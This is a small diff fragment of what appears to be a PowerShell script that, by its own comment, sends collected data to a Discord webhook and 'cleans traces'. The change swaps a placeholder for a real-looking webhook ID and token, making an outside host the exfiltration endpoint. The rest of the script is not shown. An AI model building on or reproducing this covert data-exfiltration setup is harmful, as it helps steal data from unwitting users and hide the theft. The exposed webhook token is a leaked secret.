@@ -3,7 +3,7 @@
 # Sends to Discord webhook in embeds, cleans traces
 
 # Replace with your Discord webhook URL
-$webhookUrl = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
+$webhookUrl = "https://discord.com/api/webhooks/1415440233499201616/C7j65RSLi9I8jl1vCoT4_cj1Ld3zWC7g6oT0sm4MrcllGWm4RuwM7bQHLxSkgkROvLJw"
 
 # Function to send Discord embed
 function Send-DiscordEmbed {
